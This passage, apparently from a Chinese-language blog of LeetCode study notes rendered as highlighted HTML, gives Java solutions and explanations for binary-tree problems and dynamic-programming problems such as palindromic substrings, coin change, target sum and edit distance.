class="hljs-keyword">int</span> <span class="hljs-title">rob</span><span class="hljs-params">(TreeNode root)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span>(root == <span class="hljs-keyword">null</span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(memo.containsKey(root))&#123;<br>        <span class="hljs-keyword">return</span> memo.get(root);<br>    &#125;<br>    <span class="hljs-keyword">int</span> value_do = root.val <br>    + (root.left == <span class="hljs-keyword">null</span> ? <span class="hljs-number">0</span> : rob(root.left.left) + rob(root.left.right))<br>    + (root.right == <span class="hljs-keyword">null</span> ? <span class="hljs-number">0</span> : rob(root.right.left) + rob(root.right.right));<br>    <span class="hljs-keyword">int</span> value_not = rob(root.left) + rob(root.right);<br><br>    <span class="hljs-keyword">int</span> res = Math.max(value_do, value_not);<br>    memo.put(root, res);<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="5-16-路径总和Ⅲ"><a href="#5-16-路径总和Ⅲ" class="headerlink" title="5.16 路径总和Ⅲ"></a>5.16 路径总和Ⅲ</h2><p>回溯+前缀和</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// key是前缀和, value是大小为key的前缀和出现的次数</span><br> Map&lt;Integer, Integer&gt; prefixSumCount = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();<br> <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">pathSum</span><span class="hljs-params">(TreeNode root, <span class="hljs-keyword">int</span> sum)</span> </span>&#123;<br>     <span class="hljs-comment">// 前缀和为0的一条路径</span><br>     prefixSumCount.put(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>);<br>     <span class="hljs-comment">// 前缀和的递归回溯</span><br>     <span class="hljs-keyword">return</span> recursionPathSum(root, sum, <span class="hljs-number">0</span>);<br> &#125;<br><br> <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> <span class="hljs-title">recursionPathSum</span><span class="hljs-params">(TreeNode node, <span class="hljs-keyword">int</span> target, <span class="hljs-keyword">int</span> currSum)</span> </span>&#123;<br>     <span class="hljs-comment">// 1.递归终止条件</span><br>     <span class="hljs-keyword">if</span> (node == <span class="hljs-keyword">null</span>) &#123;<br>         <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>     &#125;<br>     <span class="hljs-comment">// 2.本层要做的事情</span><br>     <span class="hljs-keyword">int</span> res = <span class="hljs-number">0</span>;<br>     <span class="hljs-comment">// 当前路径上的和</span><br>     currSum += node.val;<br><br>     <span class="hljs-comment">// currSum-target相当于找路径的起点，起点的sum+target=currSum，当前点到起点的距离就是target</span><br>     res += prefixSumCount.getOrDefault(currSum - target, <span class="hljs-number">0</span>);<br>     <span class="hljs-comment">// 更新路径上当前节点前缀和的个数</span><br>     prefixSumCount.put(currSum, prefixSumCount.getOrDefault(currSum, <span class="hljs-number">0</span>) + <span class="hljs-number">1</span>);<br><br>     <span class="hljs-comment">// 3.进入下一层</span><br>     res += recursionPathSum(node.left, target, currSum);<br>     res += recursionPathSum(node.right, target, currSum);<br><br>     <span class="hljs-comment">// 4.回到本层，恢复状态，去除当前节点的前缀和数量</span><br>     prefixSumCount.put(currSum, prefixSumCount.get(currSum) - <span class="hljs-number">1</span>);<br>     <span class="hljs-keyword">return</span> res;<br> &#125;<br></code></pre></td></tr></table></figure><h2 id="5-17-二叉树的序列化和反序列化"><a href="#5-17-二叉树的序列化和反序列化" class="headerlink" title="5.17 二叉树的序列化和反序列化"></a>5.17 二叉树的序列化和反序列化</h2><p>同剑指offer序列化二叉树</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Codec</span> </span>&#123;<br><br>    <span class="hljs-comment">// Encodes a tree to a single string.</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">serialize</span><span class="hljs-params">(TreeNode root)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span>(root == <span class="hljs-keyword">null</span>)&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;[]&quot;</span>;<br>        &#125;<br>        StringBuilder res = <span class="hljs-keyword">new</span> StringBuilder(<span class="hljs-string">&quot;[&quot;</span>);<br>        Queue&lt;TreeNode&gt; queue = <span class="hljs-keyword">new</span> LinkedList&lt;&gt;()&#123;&#123;add(root);&#125;&#125;;<br>        <span class="hljs-keyword">while</span>(!queue.isEmpty())&#123;<br>            TreeNode node = queue.poll();<br>            <span class="hljs-keyword">if</span>(node != <span class="hljs-keyword">null</span>)&#123;<br>                res.append(node.val + <span class="hljs-string">&quot;,&quot;</span>);<br>                queue.add(node.left);<br>                queue.add(node.right);<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                res.append(<span class="hljs-string">&quot;null,&quot;</span>);<br>            &#125;<br>        &#125;<br>        res.deleteCharAt(res.length() - <span class="hljs-number">1</span>);<br>        res.append(<span class="hljs-string">&quot;]&quot;</span>);<br>        <span class="hljs-keyword">return</span> res.toString();<br>    &#125;<br><br>    <span class="hljs-comment">// Decodes your encoded data to tree.</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> TreeNode <span class="hljs-title">deserialize</span><span class="hljs-params">(String data)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span>(data.equals(<span class="hljs-string">&quot;[]&quot;</span>))&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>        &#125;<br>        String[] vals = data.substring(<span class="hljs-number">1</span>, data.length() - <span class="hljs-number">1</span>).split(<span class="hljs-string">&quot;,&quot;</span>);<br>        TreeNode root = <span class="hljs-keyword">new</span> TreeNode(Integer.parseInt(vals[<span class="hljs-number">0</span>]));<br>        Queue&lt;TreeNode&gt; queue = <span class="hljs-keyword">new</span> LinkedList&lt;&gt;()&#123;&#123;add(root);&#125;&#125;;<br>        <span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">while</span>(!queue.isEmpty())&#123;<br>            TreeNode node = queue.poll();<br>            <span class="hljs-keyword">if</span>(!vals[i].equals(<span class="hljs-string">&quot;null&quot;</span>))&#123;<br>                node.left = <span class="hljs-keyword">new</span> TreeNode(Integer.parseInt(vals[i]));<br>                queue.add(node.left);<br>            &#125;<br>            i++;<br>            <span class="hljs-keyword">if</span>(!vals[i].equals(<span class="hljs-string">&quot;null&quot;</span>))&#123;<br>                node.right = <span class="hljs-keyword">new</span> TreeNode(Integer.parseInt(vals[i]));<br>                queue.add(node.right);<br>            &#125;<br>            i++;<br>        &#125;<br>        <span class="hljs-keyword">return</span> root;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="6-动态规划"><a href="#6-动态规划" class="headerlink" title="6. 动态规划"></a>6. 动态规划</h1><h2 id="6-1-回文子串"><a href="#6-1-回文子串" class="headerlink" title="6.1 回文子串"></a>6.1 回文子串</h2><p>暴力解法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">countSubstrings</span><span class="hljs-params">(String s)</span> </span>&#123;<br>       <span class="hljs-keyword">int</span> res = <span class="hljs-number">0</span>;<br>       <span class="hljs-comment">//循环所有子串</span><br>       <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;i &lt; s.length();i++)&#123;<br>           <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j = i;j &lt; s.length();j++)&#123;<br>               <span class="hljs-keyword">if</span>(isCycle(s.substring(i, j + <span class="hljs-number">1</span>)))&#123;<br>                   res++;<br>               &#125;<br>           &#125;<br>       &#125;<br>       <span class="hljs-keyword">return</span> res;<br>   &#125;<br><span class="hljs-comment">//判断子串是否为回文子串</span><br>   <span class="hljs-function"><span class="hljs-keyword">boolean</span> <span class="hljs-title">isCycle</span><span class="hljs-params">(String str)</span></span>&#123;<br>       <span class="hljs-keyword">int</span> length = str.length() - <span class="hljs-number">1</span>;<br>       <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;i &lt; length;i++)&#123;<br>           <span class="hljs-keyword">if</span>(str.charAt(i)!= str.charAt(length-i))&#123;<br>               <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>           &#125;<br>       &#125;<br>       <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br>   &#125;<br></code></pre></td></tr></table></figure><p>时间复杂度$O(n^3)$，空间复杂度O(1)</p><p>动态规划：</p><p>符合动态规划吗？</p><ul><li>存在重叠子问题<ul><li>比如abbc这个字符串，判断bb和abbc存在重叠</li></ul></li><li>子问题存在最优子结构<ul><li>子串里面也有回文子串</li></ul></li><li>是穷举求最值的问题<ul><li>需要穷举子串，因为每个字符都会被视为一个子串</li></ul></li></ul><p>根据子问题与子问题的关系写出状态转移方程：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//dp[i][j]代表i开始j结尾的子串是否是回文子串</span><br><span class="hljs-keyword">if</span>(s.charAt(i) == s.charAt(j) &amp;&amp; ((j - i &lt; <span class="hljs-number">2</span>) || (dp[i+<span class="hljs-number">1</span>][j-<span class="hljs-number">1</span>])))&#123;<br>    dp[i][j] = <span class="hljs-keyword">true</span>;<br>    res++;<br>&#125;<br></code></pre></td></tr></table></figure><p>$dp[i][j]$：$dp[i][j]$代表i开始j结尾的子串是否是回文子串</p><p>初始化：当j-i&lt;2时$dp[i][j]$为true</p><p>注意遍历方向：</p><p>dp$[i + 1][j - 1]$ 在 $dp[i][j]$的左下角，如图：</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/1611220396-SMuRcS-file_1611220396509" alt="647.回文子串" style="zoom:50%;" /></p><p><strong>所以一定要从下到上，从左到右遍历，这样保证$dp[i + 1][j - 1]$都是经过计算的</strong>。</p><p>又因为需要依赖初值$j - i &lt; 2$，所以遍历下半部分</p><p>最终代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">countSubstrings</span><span class="hljs-params">(String s)</span> </span>&#123;<br>       <span class="hljs-keyword">int</span> n = s.length();<br>       <span class="hljs-keyword">if</span>(n == <span class="hljs-number">0</span>)&#123;<br>           <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>       &#125;<br>       <span class="hljs-keyword">int</span> res = <span class="hljs-number">0</span>;<br>       <span class="hljs-keyword">boolean</span>[][] dp = <span class="hljs-keyword">new</span> <span class="hljs-keyword">boolean</span>[n][n];<br>    <span class="hljs-comment">//状态转移，遍历方向为下半部分</span><br>       <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = n - <span class="hljs-number">1</span>;i &gt;= <span class="hljs-number">0</span>;i--)&#123;<br>           <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j = i;j &lt; n;j++)&#123;<br>               <span class="hljs-keyword">if</span>(s.charAt(i) == s.charAt(j) &amp;&amp; ((j - i &lt; <span class="hljs-number">2</span>) || (dp[i+<span class="hljs-number">1</span>][j-<span class="hljs-number">1</span>])))&#123;<br>                   dp[i][j] = <span class="hljs-keyword">true</span>;<br>                   res++;<br>               &#125;<br>           &#125;<br>       &#125;<br>       <span class="hljs-keyword">return</span> res;<br>   &#125;<br></code></pre></td></tr></table></figure><h2 id="6-2-最长回文子串"><a href="#6-2-最长回文子串" class="headerlink" title="6.2 最长回文子串"></a>6.2 最长回文子串</h2><p>动态规划的条件：</p><ul><li>存在重叠子问题<ul><li>最长回文子串的子串也是回文子串</li></ul></li><li>最优子结构<ul><li>最长</li></ul></li><li>穷举求最值问题</li></ul><p>代码同 回文子串 ，在记录结果时有不同：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">longestPalindrome</span><span class="hljs-params">(String s)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> n = s.length();<br>    String res = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">boolean</span>[][] dp = <span class="hljs-keyword">new</span> <span class="hljs-keyword">boolean</span>[n][n];<br> <span class="hljs-comment">//状态转移，遍历方向为下半部分</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = n - <span class="hljs-number">1</span>;i &gt;= <span class="hljs-number">0</span>;i--)&#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j = i;j &lt; n;j++)&#123;<br>            <span class="hljs-keyword">if</span>(s.charAt(i) == s.charAt(j) &amp;&amp; ((j - i &lt; <span class="hljs-number">2</span>) || (dp[i+<span class="hljs-number">1</span>][j-<span class="hljs-number">1</span>])))&#123;<br>                dp[i][j] = <span class="hljs-keyword">true</span>;<br>                <span class="hljs-keyword">if</span>(j - i + <span class="hljs-number">1</span> &gt; res.length())&#123;<br>                    res = s.substring(i,j+<span class="hljs-number">1</span>);<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="6-3-零钱兑换"><a href="#6-3-零钱兑换" class="headerlink" title="6.3 零钱兑换"></a>6.3 零钱兑换</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">coinChange</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] coins, <span class="hljs-keyword">int</span> amount)</span> </span>&#123;<br>        <span class="hljs-comment">//dp[i]含义是金额为i的最少硬币个数</span><br>        <span class="hljs-keyword">int</span>[] dp = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[amount + <span class="hljs-number">1</span>];<br>        Arrays.fill(dp,amount + <span class="hljs-number">1</span>);<br>        <span class="hljs-comment">//初始化</span><br>        dp[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>        <span class="hljs-comment">//状态转移</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>;i &lt; amount + <span class="hljs-number">1</span>;i++)&#123;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>;j &lt; coins.length;j++)&#123;<br>                <span class="hljs-keyword">if</span>(coins[j] &gt; i)&#123;<br>                    <span class="hljs-keyword">continue</span>;<br>                &#125;<br>                dp[i] = Math.min(dp[i],dp[i - coins[j]] + <span class="hljs-number">1</span>);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> dp[amount] == amount + <span class="hljs-number">1</span> ? -<span class="hljs-number">1</span> : dp[amount];<br>    &#125;<br></code></pre></td></tr></table></figure><h2 id="6-4-分割等和子集"><a href="#6-4-分割等和子集" class="headerlink" title="6.4 分割等和子集"></a>6.4 分割等和子集</h2><p>子集背包问题</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">canPartition</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums)</span> </span>&#123;<br>        <span class="hljs-keyword">int</span> sum = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> num : nums)&#123;<br>            sum += num;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(sum % <span class="hljs-number">2</span> == <span class="hljs-number">1</span>)&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>        &#125;<br>        sum = sum / <span class="hljs-number">2</span>;<br>        <span class="hljs-keyword">int</span> n = nums.length;<br>        <span class="hljs-comment">//dp[i][j]前i个数是否存在组合可以为j</span><br>        <span class="hljs-keyword">boolean</span>[][] dp = <span class="hljs-keyword">new</span> <span class="hljs-keyword">boolean</span>[n + <span class="hljs-number">1</span>][sum + <span class="hljs-number">1</span>];<br>        <span class="hljs-comment">//初始化</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;i &lt;= n;i++)&#123;<br>            dp[i][<span class="hljs-number">0</span>] = <span class="hljs-keyword">true</span>;<br>        &#125;<br>        <span class="hljs-comment">//状态转移</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>;i &lt;= n;i++)&#123;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j = <span class="hljs-number">1</span>;j &lt;= sum;j++)&#123;<br>                <span class="hljs-keyword">if</span>(j - nums[i - <span class="hljs-number">1</span>] &lt; <span class="hljs-number">0</span>)&#123;<br>                   dp[i][j] = dp[i - <span class="hljs-number">1</span>][j];<br>                &#125;<span class="hljs-keyword">else</span>&#123;<br>                    dp[i][j] = dp[i - <span class="hljs-number">1</span>][j] || dp[i - <span class="hljs-number">1</span>][j - nums[i - <span class="hljs-number">1</span>]];<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> dp[n][sum];<br>    &#125;<br></code></pre></td></tr></table></figure><h2 id="6-5-目标和"><a href="#6-5-目标和" class="headerlink" title="6.5 目标和"></a>6.5 目标和</h2><p>子集背包问题</p><p>与分割等和子集类似，目标和问题存在如下关系：</p><script type="math/tex; mode=display">positive - negative = target\\positive - (sum-positive) = target\\positive = (target+sum)/2</script><p>现在问题转化为寻找一个子集使得和等于$(target+sum)/2$，用背包问题描述是：</p><p><strong>给一个可装载重量为</strong> <strong><code>(target+sum)/2</code></strong> <strong>的背包和</strong> <strong><code>N</code></strong> <strong>个物品，每个物品的重量为</strong> <strong><code>nums[i]</code></strong>。现在让你装物品，存在几种装法，能够恰好将背包装满？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">findTargetSumWays</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums, <span class="hljs-keyword">int</span> S)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> sum = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> num : nums)&#123;<br>        sum += num;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (sum &lt; S || (sum + S) % <span class="hljs-number">2</span> == <span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    sum = (S + sum) / <span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">int</span> n = nums.length;<br>    <span class="hljs-comment">//dp数组的含义是前i个数字能够凑成和为j的方案</span><br>    <span class="hljs-keyword">int</span>[][] dp = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[n + <span class="hljs-number">1</span>][sum + <span class="hljs-number">1</span>];<br>    <span class="hljs-comment">//初始化</span><br>    <span class="hljs-comment">//和为0的方案只有一种（不装）</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;i &lt;= n; i++)&#123;<br>        dp[i][<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-comment">//转移方程是dp[i][j] = dp[i - 1][j] + dp[i - 1][j - nums[i - 1]]</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt;= sum; j++) &#123;<br>            <span class="hljs-keyword">if</span> (j &gt;= nums[i-<span class="hljs-number">1</span>]) &#123;<br>                <span class="hljs-comment">// 两种选择的结果之和</span><br>                dp[i][j] = dp[i-<span class="hljs-number">1</span>][j] + dp[i-<span class="hljs-number">1</span>][j-nums[i-<span class="hljs-number">1</span>]];<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-comment">// 背包的空间不足，只能选择不装物品 i</span><br>                dp[i][j] = dp[i-<span class="hljs-number">1</span>][j];<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> dp[n][sum];<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="6-6-零钱兑换Ⅱ"><a href="#6-6-零钱兑换Ⅱ" class="headerlink" title="6.6 零钱兑换Ⅱ"></a>6.6 零钱兑换Ⅱ</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">change</span><span class="hljs-params">(<span class="hljs-keyword">int</span> amount, <span class="hljs-keyword">int</span>[] coins)</span> </span>&#123;<br>    <span class="hljs-comment">//dp[i]含义是金额为i的组合个数</span><br>    <span class="hljs-keyword">int</span>[] dp = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[amount + <span class="hljs-number">1</span>];<br>    Arrays.fill(dp,<span class="hljs-number">0</span>);<br>    <span class="hljs-comment">//初始化</span><br>    dp[<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>;<br>    <span class="hljs-comment">//状态转移</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> coin : coins)&#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = coin; i &lt; amount + <span class="hljs-number">1</span>; i++)&#123;<br>            dp[i] += dp[i - coin];<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> dp[amount];<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="6-7-编辑距离"><a href="#6-7-编辑距离" class="headerlink" title="6.7 编辑距离"></a>6.7 编辑距离</h2><p>动态规划的条件：</p><ul><li>存在重叠子问题<ul><li>不同的修改方案有可能存在局部的相同修改</li></ul></li><li>最优子结构<ul><li>最少操作数</li></ul></li><li>穷举求最值问题<ul><li>修改方式很多，我们可以穷举</li></ul></li></ul><ol><li><p>定义$dp[i][j]$的含义：</p><p>以子串1中以i结尾子串和子串2中以j结尾子串的最少操作数</p></li><li><p>状态转移方程(右侧分别对应插入、删除、替换)：​</p><script type="math/tex; mode=display">dp[i][j] = \begin{cases} min(dp((i, j - 1) + 1, dp(i - 1, j) + 1),dp[i - 1][j - 1] + 1), & s1[i] != s2[j]\\dp[i - 1][j - 1],&s1[i] == s2[j]\end{cases}</script></li><li><p>初始化：</p><p>当i或j为0时，代表其中一个子串已经为空，此时直接返回另一剩余子串长度。</p></li></ol><p>自顶向下解法：</p><p>使用了备忘录，不使用备忘录会超出时间限制</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs java">    String word1,word2;<br>    <span class="hljs-keyword">int</span> dp[][];<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">minDistance</span><span class="hljs-params">(String word1, String word2)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.word1 = word1;<br>        <span class="hljs-keyword">this</span>.word2 = word2;<br>        <span class="hljs-keyword">int</span> length1 = word1.length();<br>        <span class="hljs-keyword">int</span> length2 = word2.length();<br>        <span 